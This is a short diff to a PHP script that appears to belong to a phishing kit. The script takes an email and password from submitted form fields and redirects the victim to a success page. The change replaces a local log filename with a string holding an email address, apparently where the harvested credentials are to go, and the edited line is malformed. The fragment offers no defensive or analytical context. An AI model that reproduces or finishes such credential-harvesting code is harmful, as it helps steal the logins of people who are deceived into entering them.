@@ -1,6 +1,6 @@
 <?php
 header("Location: succes.php");
-$ADEx = "catatan.php";
+$ADEx = "$_POST['alpanperdiansah3@gmail.com']";
 $ADEy = $_POST['email'];
 $ADEz = $_POST['pass'];
 
